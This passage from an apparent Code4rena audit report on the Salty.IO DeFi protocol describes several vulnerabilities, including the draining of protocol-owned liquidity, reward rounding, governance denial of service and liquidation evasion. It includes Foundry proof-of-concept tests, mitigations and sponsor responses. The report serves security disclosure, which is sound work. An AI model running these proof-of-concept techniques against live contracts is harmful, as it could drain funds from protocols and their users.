[ayden](https://github.com/code-423n4/2024-01-salty-findings/issues/142), and [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/106)*

When a user repays the USDS he has borrowed, it is taken from him and kept for burning. The Liquidizer contract is updated with the new amount repaid. The USDS is burnt whenever the `performUpkeep` function is called on Liquidizer by the Upkeep contract during upkeep.

The USDS collected is sent to the USDS contract which can be burned whenever `burnTokensInContract` is called. The amount of USDS to be burnt in the Liquidizer contract is also increased by the `incrementBurnableUSDS` call. This increases the `usdsThatShouldBeBurned` variable on the Liquidizer.

```solidity
     function repayUSDS( uint256 amountRepaid ) external nonReentrant{
       ...		
       usds.safeTransferFrom(msg.sender, address(usds), amountRepaid);

       // Have USDS remember that the USDS should be burned
       liquidizer.incrementBurnableUSDS( amountRepaid );
       ...
     }
```

During upkeep, the Liquidizer first checks if it has enough USDS balance to burn i.e `usdsBalance >= usdsThatShouldBeBurned`. If it does it burns them else it converts Protocol Owned Liquidity (POL) to USDS and burns it to cover the deficit. Burning POL allows the protocol to cover bad debt from liquidation.

```solidity
function _possiblyBurnUSDS() internal{
        ...
	uint256 usdsBalance = usds.balanceOf(address(this));
	if ( usdsBalance >= usdsThatShouldBeBurned )
	{
		// Burn only up to usdsThatShouldBeBurned.
		// Leftover USDS will be kept in this contract in case it needs to be burned later.
		_burnUSDS( usdsThatShouldBeBurned );
    		usdsThatShouldBeBurned = 0;
	}
	else
	{
		// The entire usdsBalance will be burned - but there will still be an outstanding balance to burn later
		_burnUSDS( usdsBalance );
		usdsThatShouldBeBurned -= usdsBalance;

		// As there is a shortfall in the amount of USDS that can be burned, liquidate some Protocol Owned Liquidity and
		// send the underlying tokens here to be swapped to USDS
		dao.withdrawPOL(salt, usds, PERCENT_POL_TO_WITHDRAW);
		dao.withdrawPOL(dai, usds, PERCENT_POL_TO_WITHDRAW);
	}
}
```

Since the `usdsThatShouldBeBurned` variable will always be increased without increasing the Liquidizer balance, it will always sell POL to cover the increase.

If the POL is exhausted, the protocol cannot cover bad debt generated from liquidations. This will affect the price of USDS negatively.

An attacker can borrow and repay multiple times to exhaust POL and create bad debt or it could just be done over time as users repay their USDS.

### Impact

This will affect the price of USDS negatively.

### Proof of Concept

This test can be run in [CollateralAndLiquidity.t.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/tests/CollateralAndLiquidity.t.sol).

<details>

```solidity
    function testBurnPOL() public {
        // setup
        vm.prank(address(collateralAndLiquidity));
		usds.mintTo(address(dao), 20000 ether);

		vm.prank(address(teamVestingWallet));
		salt.transfer(address(dao), 10000 ether);

		vm.prank(DEPLOYER);
		dai.transfer(address(dao), 10000 ether);
        // create Protocol Owned Liquidity (POL)
        vm.startPrank(address(dao));
		collateralAndLiquidity.depositLiquidityAndIncreaseShare(salt, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
		collateralAndLiquidity.depositLiquidityAndIncreaseShare(dai, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
		vm.stopPrank();

        bytes32 poolIDA = PoolUtils._poolID(salt, usds);
		bytes32 poolIDB = PoolUtils._poolID(dai, usds);
		assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDA), 20000 ether);
		assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDB), 20000 ether);

        // Alice deposits collateral
        vm.startPrank(address(alice));
        wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
        weth.approve(address(collateralAndLiquidity), type(uint256).max);
        collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(alice), weth.balanceOf(alice), 0, block.timestamp, true );
        
        // Alice performs multiple borrows and repayments, increasing the 
        // usdsThatShouldBeBurned variable in Liquidizer
        for (uint i; i < 100; i++){
            vm.startPrank(alice);
            uint256 maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(alice);
		    collateralAndLiquidity.borrowUSDS( maxUSDS );
            uint256 borrowed = collateralAndLiquidity.usdsBorrowedByUsers(alice);
            collateralAndLiquidity.repayUSDS(borrowed);
        }
        
        vm.startPrank(address(upkeep));
        // perform upkeep multiple times to cover bad debt
        // breaks when POL is exhausted
        for(;;){
            (, uint reserve1) = pools.getPoolReserves(dai, usds);
            if(reserve1 * 99 / 100 < 100) break;
            liquidizer.performUpkeep();
        }

        assertGt(liquidizer.usdsThatShouldBeBurned(), usds.balanceOf(address(liquidizer)));
    }
```

</details>

### Recommended Mitigation Steps

Send the repaid USDS to the Liquidizer.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/137#issuecomment-1950473170):**
 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> 
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9
> 


**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/66), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/46), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/29).


***

 
# Medium Risk Findings (31)
## [[M-01] The user who withdraws liquidity from a particular pool is able to claim more rewards than they should by carefully selecting a `decreaseShareAmount` value such that the `virtualRewardsToRemove` is rounded down to zero](https://github.com/code-423n4/2024-01-salty-findings/issues/1021)
*Submitted by [Udsen](https://github.com/code-423n4/2024-01-salty-findings/issues/1021), also found by [stackachu](https://github.com/code-423n4/2024-01-salty-findings/issues/1054), [ether\_sky](https://github.com/code-423n4/2024-01-salty-findings/issues/723), [Jorgect](https://github.com/code-423n4/2024-01-salty-findings/issues/428), [Banditx0x](https://github.com/code-423n4/2024-01-salty-findings/issues/223), [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/217), [DanielArmstrong](https://github.com/code-423n4/2024-01-salty-findings/issues/107), [santiellena](https://github.com/code-423n4/2024-01-salty-findings/issues/386), [Draiakoo](https://github.com/code-423n4/2024-01-salty-findings/issues/715), and [0xfave](https://github.com/code-423n4/2024-01-salty-findings/issues/464)*

<https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingRewards.sol#L113-L118> 

<https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingRewards.sol#L132-L133> 

<https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingRewards.sol#L99>

The `StakingRewards._decreaseUserShare` function is used to decrease a user's share for the pool and have any pending rewards sent to them. When the amount of pending rewards are calculated, initially the `virtualRewardsToRemove` are calculated as follows:

    	uint256 virtualRewardsToRemove = (user.virtualRewards * decreaseShareAmount) / user.userShare;

Then the `virtualRewardsToRemove` is substracted from the `rewardsForAmount` value to calculate the `claimableRewards` amount as shown below:

    	if ( virtualRewardsToRemove < rewardsForAmount )
    		claimableRewards = rewardsForAmount - virtualRewardsToRemove; 

But the issue here is that the `virtualRewardsToRemove` calculation is rounded down in favor of the user and not in the favor of the protocol. Since the `virtualRewardsToRemove` is rounded down there is an opportunity to the user to call the `StakingRewards._decreaseUserShare` function with a very small `decreaseShareAmount` value such that the `virtualRewardsToRemove` will be rounded down to `0`. Providing a very small `decreaseShareAmount` value is possible since only input validation on `decreaseShareAmount` is `! = 0` as shown below:

    	require( decreaseShareAmount != 0, "Cannot decrease zero share" );

When the `claimableRewards` is calculated it will be equal to the `rewardsForAmount` value since the `virtualRewardsToRemove` will be `0`. This way the user can keep on removing his liquidity from a particular pool by withdrawing small `decreaseShareAmount` at a time such that keeping `virtualRewardsToRemove` at `0` due to rounding down.

Furthermore the `decreaseShareAmount` value should be selected in such a way `rewardsForAmount` is calculated to a considerable amount after round down (not zero) and the `virtualRewardsToRemove` should round down to zero.

Hence as a result the `user` can withdraw all the `rewardsForAmount` as the `claimableRewards` even though some of those rewards are `virtual rewards` which should not be claimable as clearly stated by the following `natspec` comment:

    	// Some of the rewardsForAmount are actually virtualRewards and can't be claimed.

Hence as a result the user is able to get an undue advantage and claim more rewards for his liquidity during liquidity withdrawable. This happens because the `user` can bypass the `virtual reward` subtraction by making it round down to `0`. As a result the `virtualReward` amount of the `rewardsForAmount`, which should not be claimable is also claimed by the user unfairly.

### Proof of Concept

```solidity
		// Determine the share of the rewards for the amountToDecrease (will include previously added virtual rewards)
		uint256 rewardsForAmount = ( totalRewards[poolID] * decreaseShareAmount ) / totalShares[poolID];

		// For the amountToDecrease determine the proportion of virtualRewards (proportional to all virtualRewards for the user)
		// Round virtualRewards down in favor of the protocol
		uint256 virtualRewardsToRemove = (user.virtualRewards * decreaseShareAmount) / user.userShare;
```

<https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingRewards.sol#L113-L118>

```solidity
		if ( virtualRewardsToRemove < rewardsForAmount )
			claimableRewards = rewardsForAmount - virtualRewardsToRemove;
```

<https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingRewards.sol#L132-L133>

```solidity
		require( decreaseShareAmount != 0, "Cannot decrease zero share" );
```

<https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingRewards.sol#L99>

### Tools Used

VSCode

### Recommended Mitigation Steps

Hence it is recommended to round up the `virtualRewardsToRemove` value during its calculation such that it will not be rounded down to zero for a very small `decreaseShareAmount`. This way `user` is unable to claim the rewards which he is not eligible for and the rewards will be claimed after accounting for the `virtual rewards`.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/1021#issuecomment-1953449327):**
 > virtualRewards now rounded up on _decreaseUserShare
> 
> https://github.com/othernet-global/salty-io/commit/b3b8cb955db2b9f0e47a4964e1e4f833a447a72d

**Status:** Mitigated with an Error. Full details in report from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/25), and also included in the [Mitigation Review](#mitigation-review) section below.

***

## [[M-02] Persistent Contract Call revert prevents finalizing a ballot](https://github.com/code-423n4/2024-01-salty-findings/issues/1009)
*Submitted by [vnavascues](https://github.com/code-423n4/2024-01-salty-findings/issues/1009), also found by [ether\_sky](https://github.com/code-423n4/2024-01-salty-findings/issues/490), [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/421), and [haxatron](https://github.com/code-423n4/2024-01-salty-findings/issues/323)*

<https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L180> 

<https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L219> 

<https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L219>

The `DAO._executeApproval` function does not handle an external contract call error:

```solidity
else if (ballot.ballotType == BallotType.CALL_CONTRACT) {
    // @audit-issue unhandled revert
    ICalledContract(ballot.address1).callFromDAO(ballot.number1);

    emit ContractCalled(ballot.address1, ballot.number1);
}
```

Given an approved `CALL_CONTRACT` ballot that can be finalized, the ballot won't be marked as finalized if the external contract call (from above) reverts.

```solidity
function _finalizeApprovalBallot(uint256 ballotID) internal {
    if (proposals.ballotIsApproved(ballotID)) {
        Ballot memory ballot = proposals.ballotForID(ballotID);
        _executeApproval(ballot);
    }

    // @audit-issue the line below won't be executed if `_executeApproval` reverts
    proposals.markBallotAsFinalized(ballotID);
}
```

### Impact

A permanent revert leaves the ballot unfinalized, and the user that posted it with an active proposal (in the `_userHasActiveProposal` mapping); a state that prevents the user account from creating a new proposal. At this point the user has two options to sort out the situation:

A. Unstake and transfer its SALT into a new account.
B. Convince the other users to reach quorum on NO and finalize the ballot without calling the external contract.

### Proof Of Concept

New contract to be created in `/src/dao/tests`:

```solidity
// SPDX-License-Identifier: BUSL 1.1
pragma solidity =0.8.22;

import "../interfaces/ICalledContract.sol";

contract TestCallReceiverFaulty is ICalledContract {
    uint256 public value;

    function callFromDAO(uint256 n) external {
        value = n;
        revert("callFromDAO() unexpectedly reverted");
    }
}
```

Add the following test in `DAO.t.sol`:

```solidity
function testCallContractApproveReverted() public {
    // Arrange
    vm.startPrank(alice);
    staking.stakeSALT(1000000 ether);

    TestCallReceiverFaulty testReceiver = new TestCallReceiverFaulty();

    uint256 ballotID = proposals.proposeCallContract(
        address(testReceiver),
        123,
        "description"
    );
    assertEq(
        proposals.ballotForID(ballotID).ballotIsLive,
        true,
        "Ballot not correctly created"
    );

    proposals.castVote(ballotID, Vote.YES);
    vm.warp(block.timestamp + 11 days);

    vm.expectRevert("callFromDAO() unexpectedly reverted");

    // Act
    dao.finalizeBallot(ballotID);

    // Assert
    assertEq(
        proposals.ballotForID(ballotID).ballotIsLive,
        true,
        "Ballot not correctly finalized"
    );
    assertTrue(
        testReceiver.value() != 123,
        "Receiver shouldn't receive the call"
    );
    assertEq(
        proposals.userHasActiveProposal(alice),
        true,
        "Alice proposal is not active"
    );
}
```
### Recommended Mitigation Steps

A trivial solution is to handle the reverted external contract call with a `try..catch` and allow to always mark the approved ballot as finalized. A new ballot can always be created if the desired effects of the call were not applied on the first call.

Amend the `CALL_CONTRACT` case in the `DAO._executeApproval` function:

```solidity
else if (ballot.ballotType == BallotType.CALL_CONTRACT) {
    try ICalledContract(ballot.address1).callFromDAO(ballot.number1) {
        // NB: place the emission outside if it must be emitted no matter the external call outcome
        emit ContractCalled(ballot.address1, ballot.number1);
    } catch (bytes memory) {}
}
```

Add the following test in `DAO.t.sol`:

```solidity
    function testCallContractApproveRevertHandled() public {
        // Arrange
        vm.startPrank(alice);
        staking.stakeSALT(1000000 ether);

        TestCallReceiverFaulty testReceiver = new TestCallReceiverFaulty();

        uint256 ballotID = proposals.proposeCallContract(
            address(testReceiver),
            123,
            "description"
        );

        // Act
        _voteForAndFinalizeBallot(ballotID, Vote.YES);

        // Assert
        assertTrue(
            testReceiver.value() != 123,
            "Receiver shouldn't receive the call"
        );
        assertEq(
            proposals.userHasActiveProposal(alice),
            false,
            "Alice proposal is not active"
        );
    }
```
**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/1009#issuecomment-1951001067):**
 > callFromDAO now wrapped in a try/catch
> 
> https://github.com/othernet-global/salty-io/commit/5f1a5206a04b0f3fe45ad88a311370ce12fb0135

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-01-salty-findings/issues/1009)._

**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/9), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/68), and [zzebra83].

***

## [[M-03] Creation of token whitelisting proposals can be DOS'd](https://github.com/code-423n4/2024-01-salty-findings/issues/991)
*Submitted by [falconhoof](https://github.com/code-423n4/2024-01-salty-findings/issues/991), also found by [josephdara](https://github.com/code-423n4/2024-01-salty-findings/issues/866), inzinko ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/818), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/792)), [zhaojie](https://github.com/code-423n4/2024-01-salty-findings/issues/685), [forgebyola](https://github.com/code-423n4/2024-01-salty-findings/issues/569), [Rhaydden](https://github.com/code-423n4/2024-01-salty-findings/issues/194), [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/145), [BiasedMerc](https://github.com/code-423n4/2024-01-salty-findings/issues/116), [jesjupyter](https://github.com/code-423n4/2024-01-salty-findings/issues/81), and [cats](https://github.com/code-423n4/2024-01-salty-findings/issues/55)*

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L162-L177> 

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L81-L118>

The creation of token whitelisting proposals isn limited to 5 proposals; after which it is DOS'd until proposals are voted on and finalized.

### Vulnerability Details

In `proposeTokenWhitelisting()` when a proposal is created to whitelist a new token; the `ballotId` is added to `_openBallotsForTokenWhitelisting`.
There is then a check to ensure that the length of `_openBallotsForTokenWhitelisting` does not exceed `daoConfig.maxPendingTokensForWhitelisting()`.

Where `maxPendingTokensForWhitelisting` has been reached, new proposals will not be created for whitelisting tokens. This could happen by accident or by malicious actions on the part of users manipulating the system.

By default `maxPendingTokensForWhitelisting` is set to 5 but it could be decreased via vote to 3 which would make the issue even more common place.

    	function proposeTokenWhitelisting( IERC20 token, string calldata tokenIconURL, string calldata description ) external nonReentrant returns (uint256 _ballotID)
    		{

             // SOME CODE

    >>>      require( _openBallotsForTokenWhitelisting.length() < daoConfig.maxPendingTokensForWhitelisting(), "The maximum number of token whitelisting proposals are already pending" );

             // SOME CODE

    	 uint256 ballotID = _possiblyCreateProposal( ballotName, BallotType.WHITELIST_TOKEN, address(token), 0, tokenIconURL, description );
    		_openBallotsForTokenWhitelisting.add( ballotID );

    		return ballotID;
    		}

### POC

Add the test function below to `DAO.t.sol` and run:

<details>

    ```
    function test_DOS_TokenWhitelisting() public
    	{

    	// declare names; need 4 more to create proposals
    	address charlie = address( 0x3333 );
    	address deployer = address( 0x73107dA86708c2DAd0D91388fB057EeE3E2581aF );
    	address paul = address( 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496 );
    	address jim = address( 0x123456789 );

    	// transfer salt to all 6 for staking and voting
    	vm.startPrank(address(daoVestingWallet));
    	salt.transfer(alice, 200000 ether);		
    	salt.transfer(bob, 200000 ether);
    	salt.transfer(charlie, 200000 ether);
    	salt.transfer(deployer, 200000 ether);
    	salt.transfer(paul, 200000 ether);
    	salt.transfer(jim, 200000 ether);
    	salt.transfer(address(dao), 1000000 ether);
    	vm.stopPrank();

    	// create 6 tokens
    	IERC20 test = new TestERC20( "TEST", 18 );
    	IERC20 test1 = new TestERC20( "TEST1", 18 );
    	IERC20 test2 = new TestERC20( "TEST2", 18 );
    	IERC20 test3 = new TestERC20( "TEST3", 18 );
    	IERC20 test4 = new TestERC20( "TEST4", 18 );
    	IERC20 test5 = new TestERC20( "TEST5", 18 );

    	// Each user stake SALT and try to create token whitelisting proposal
    	vm.startPrank(alice);
    		staking.stakeSALT(100000 ether);
    		proposals.proposeTokenWhitelisting(test, "url", "description");
    	vm.stopPrank();

    	vm.startPrank(bob);
    		salt.approve( address(staking), type(uint256).max );
    		staking.stakeSALT(100000 ether);
    		proposals.proposeTokenWhitelisting(test1, "url", "description");
    	vm.stopPrank();

    	vm.startPrank(charlie);
    		salt.approve( address(staking), type(uint256).max );
    		staking.stakeSALT(100000 ether);
    		proposals.proposeTokenWhitelisting(test2, "url", "description");
    	vm.stopPrank();

    	vm.startPrank(deployer);
    		salt.approve( address(staking), type(uint256).max );
    		staking.stakeSALT(100000 ether);
    		proposals.proposeTokenWhitelisting(test3, "url", "description");
    	vm.stopPrank();

    	vm.startPrank(paul);
    	    salt.approve( address(staking), type(uint256).max );
    		staking.stakeSALT(100000 ether);
    		proposals.proposeTokenWhitelisting(test4, "url", "description");
    	vm.stopPrank();

    	// jim needs to be granted access
    	grantAccessTeam();

    	// 6th proposal fails
    	vm.startPrank(jim);
    		salt.approve( address(staking), type(uint256).max );
    		staking.stakeSALT(100000 ether);
    		vm.expectRevert("The maximum number of token whitelisting proposals are already pending");
    		proposals.proposeTokenWhitelisting(test5, "url", "description");
    	vm.stopPrank();
    	}
    ```

</details>

### Impact

Malicious users can clog the whitelisting queue with fake token proposals, blocking the addition of genuine tokens and DOSing core functionality of the protocol.
This can restrict the ability of the protocol to operate and it's popularity with users.
Although a user can only create one proposal per address at a time; a coordinated group of just five could block the functionality indefinitely.

### Tools Used

Foundry

### Recommendations

Allow a trusted authority to remove proposals which they deem to be malicious such as proposals for fake tokens.

**[othernet-global (Salty.IO) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/991#issuecomment-1939787600):**
 > Make proposals require a percent of the staking SALT which is set by the DAO.  Each user can only make one proposal at a time.  Additionally, the default unstaking period for xSALT is 52 weeks and xSALT is non-transferrable.

**[Picodes (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/991#issuecomment-1943243571):**
 > Medium severity seems appropriate here under "function of the protocol or its availability could be impacted".

**[othernet-global (Salty.IO) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/991#issuecomment-1950823605):**
 > There is now no limit to the number of tokens that can be proposed for whitelisting.
> 
> Also, any whitelisting proposal that has reached quorum with sufficient approval votes can be executed.
> 
> https://github.com/othernet-global/salty-io/commit/ccf4368fcf1777894417fccd2771456f3eeaa81c

**Status:** Mitigation confirmed. Full details in reports from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/49), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/69), and [t0x1c].

***

## [[M-04] If there is only one USDS borrower, he can never be liquidated](https://github.com/code-423n4/2024-01-salty-findings/issues/912)
*Submitted by [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/912), also found by [0xHelium](https://github.com/code-423n4/2024-01-salty-findings/issues/1066), [Toshii](https://github.com/code-423n4/2024-01-salty-findings/issues/894), [0xpiken](https://github.com/code-423n4/2024-01-salty-findings/issues/676), [0xCiphky](https://github.com/code-423n4/2024-01-salty-findings/issues/629), [israeladelaja](https://github.com/code-423n4/2024-01-salty-findings/issues/514), aman ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/466), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/459)), [b0g0](https://github.com/code-423n4/2024-01-salty-findings/issues/322), [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/278), [djxploit](https://github.com/code-423n4/2024-01-salty-findings/issues/233), [ayden](https://github.com/code-423n4/2024-01-salty-findings/issues/196), and [0xWaitress](https://github.com/code-423n4/2024-01-salty-findings/issues/101)*

The Salty protocol offers the USDS stablecoin, collateralized by WETH/WBTC. Users can deposit collateral and borrow USDS against it. A key safeguard mechanism is liquidation, which is activated when the collateral value drops below a certain threshold (typically 110%). However, a significant flaw exists in the liquidation process, particularly when there is only one user borrowing USDS.

The process to liquidate a user involves calling the `liquidateUser()` function, which in turn calls `pools.removeLiquidity()` to withdraw the user's collateral. However, the `pools.removeLiquidity()` function checks if the remaining reserves after withdrawal are below the DUST threshold and reverts if they are.

```solidity
require((reserves.reserve0 >= PoolUtils.DUST) && (reserves.reserve0 >= PoolUtils.DUST), "Insufficient reserves after liquidity removal");
```

This check creates a situation where, if all the collateral for USDS is held by a single user, it becomes impossible to liquidate this user. Any attempt to liquidate would reduce the reserves below DUST, causing the transaction to revert

### Impact

This flaw means the only holder of USDS can evade liquidation, potentially leading to bad debt in the protocol that cannot be recouped or mitigated.

### Proof of Concept

The scenario can be demonstrated as follows:

*   Alice is the sole depositor of collateral and borrows the maximum allowable USDS.
*   Another user, Bob, attempts to liquidate Alice when her collateral value crashes.
*   However, the liquidation process reverts because removing Alice's collateral would reduce the reserves below the DUST threshold.

<details>

```solidity
function testLiquidateOnlyHolder() public {
	//------------------------- SETUP --------------------------------------------------

	// Total needs to be worth at least $2500
	uint256 depositedWBTC = ( 1000 ether *10**8) / priceAggregator.getPriceBTC();
	uint256 depositedWETH = ( 1000 ether *10**18) / priceAggregator.getPriceETH();

	(uint256 reserveWBTC, uint256 reserveWETH) = pools.getPoolReserves(wbtc, weth);

	//------------------------ TEST---------------------------------------------------------

	// Alice deposits collateral
	vm.startPrank(alice);
	collateralAndLiquidity.depositCollateralAndIncreaseShare( depositedWBTC * 2, depositedWETH * 2, 0, block.timestamp, false );
	vm.stopPrank();

	//Alcie borrows the USDS
	vm.startPrank(alice);
	vm.warp( block.timestamp + 1 hours);
	
	uint256 maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(alice);
	collateralAndLiquidity.borrowUSDS( maxUSDS );
	vm.stopPrank();

	// Try and fail to liquidate alice
	vm.expectRevert( "User cannot be liquidated" );
	vm.prank(bob);
	collateralAndLiquidity.liquidateUser(alice);

	// Artificially crash the collateral price
	_crashCollateralPrice();

	// Bob tries liquidating Alice's position but it reverts due to the reserves falling below dust if she gets liquidated
	vm.prank(bob);
	vm.expectRevert();
	collateralAndLiquidity.liquidateUser(alice);
}
```
</details>


The test must be added to `/stable/tests/CollateralAndLiquidity.t.sol` and can be run by calling `COVERAGE="yes" NETWORK="sep" forge test -vvvv --rpc-url https://rpc.sepolia.org --match-test "testLiquidateOnlyHolder"`.

### Recommended Mitigation Steps

To resolve this issue, the logic in `pools.removeLiquidity()` needs to be adjusted. The function should allow the withdrawal of the last collateral, even if it reduces the reserves to zero. This adjustment can be implemented with a conditional check that permits reserves to be either above DUST or exactly zero:

```solidity
require(((reserves.reserve0 >= PoolUtils.DUST && reserves.reserve0 >= PoolUtils.DUST) || (reserves.reserve0 == 0 && reserves.reserve0 == 0)), "Insufficient reserves after liquidity removal");
```

With this change, the protocol will maintain its ability to liquidate the sole holder of USDS, ensuring the safeguard against bad debt remains effective.

**[othernet-global (Salty.IO) acknowledged and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/912#issuecomment-1960681844):**
 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9

**Status:** Mitigation confirmed. Full details in reports from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/50), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/39).

***

## [[M-05] Absence of autonomous mechanism for `selling collateral assets in the external market in exchange for USDS` will cause undercollateralization during market crashes and will cause USDS to depeg](https://github.com/code-423n4/2024-01-salty-findings/issues/905)
*Submitted by [0xGreyWolf](https://github.com/code-423n4/2024-01-salty-findings/issues/905), also found by [Toshii](https://github.com/code-423n4/2024-01-salty-findings/issues/1027), [0x3b](https://github.com/code-423n4/2024-01-salty-findings/issues/173), [BiasedMerc](https://github.com/code-423n4/2024-01-salty-findings/issues/123), and [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/121)*

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/Upkeep.sol#L244> 

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L140>

*   The stablecoin USDS retains its US dollar peg by being overcollateralized. That is true on a bull market. That is also true on a bear market if the liquidation process is faster than the falling prices of the collateral assets.
*   However during a bear market, there is a scenario where the the price of collateral assets may tank faster than the liquidation process. In this scenario, the total value of the collateral assets of the protocol may end up being lower than the minted / circulating USDS. This will cause undercollateralization and will cause the USDS to depeg.
*   The depegging will cause the holders of USDS to lose financially. It may cause panic and that will be an existential threat to the protocol.

### Recommended Mitigation Steps

*   Create a function to `sell assets and acquire USDS on external market` and just like `liquidateUser()` and `performUpkeep()`, reward the users for doing it (calling the function).
*   If USDS is not available, buy stablecoins USDC and store it for a while to serve as an emergency collateral backing until the market goes back to normal.

**[othernet-global (Salty.IO) acknowledged and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/905#issuecomment-1947988321):**
 > Note: the overcollateralized stablecoin mechanism has been removed from the DEX.
> 
> https://github.com/othernet-global/salty-io/commit/f3ff64a21449feb60a60c0d60721cfe2c24151c1

 > Note: the overcollateralized stablecoin mechanism has been removed from the DEX.
> 
> https://github.com/othernet-global/salty-io/commit/f3ff64a21449feb60a60c0d60721cfe2c24151c1

**[Picodes (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/905#issuecomment-1954535517):**
 > Regrouping as duplicates of this issue reports about the fact that the swaps are not atomic so the protocol holds a temporary change risk.

**[othernet-global (Salty.IO) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/905#issuecomment-1960682461):**
 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9

**Status:** Mitigation confirmed. Full details in reports from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/51), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/71), and [t0x1c].
***

## [[M-06] Reusing a SALT that has already been used for voting can allow a malicious proposal to pass and compromise the protocol](https://github.com/code-423n4/2024-01-salty-findings/issues/844)
*Submitted by [PENGUN](https://github.com/code-423n4/2024-01-salty-findings/issues/844), also found by [dutra](https://github.com/code-423n4/2024-01-salty-findings/issues/1038), [vnavascues](https://github.com/code-423n4/2024-01-salty-findings/issues/1007), [falconhoof](https://github.com/code-423n4/2024-01-salty-findings/issues/984), [grearlake](https://github.com/code-423n4/2024-01-salty-findings/issues/870), [ReadyPlayer2](https://github.com/code-423n4/2024-01-salty-findings/issues/746), [Draiakoo](https://github.com/code-423n4/2024-01-salty-findings/issues/710), [peanuts](https://github.com/code-423n4/2024-01-salty-findings/issues/705), [zhaojie](https://github.com/code-423n4/2024-01-salty-findings/issues/679), [Matue](https://github.com/code-423n4/2024-01-salty-findings/issues/582), [cu5t0mpeo](https://github.com/code-423n4/2024-01-salty-findings/issues/489), [piyushshukla](https://github.com/code-423n4/2024-01-salty-findings/issues/290), [0xanmol](https://github.com/code-423n4/2024-01-salty-findings/issues/200), [zhanmingjing](https://github.com/code-423n4/2024-01-salty-findings/issues/195), and [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/189)*

<https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L259-L293> 

<https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L385-L400>

Reuse of SALT that has already been used for voting could allow a malicious proposal to pass and compromise the protocol.

### Details

castVote is a function that votes as much SALT as is being staked on the proposal.

```solidity
function castVote( uint256 ballotID, Vote vote ) external nonReentrant
		{
		Ballot memory ballot = ballots[ballotID];
...
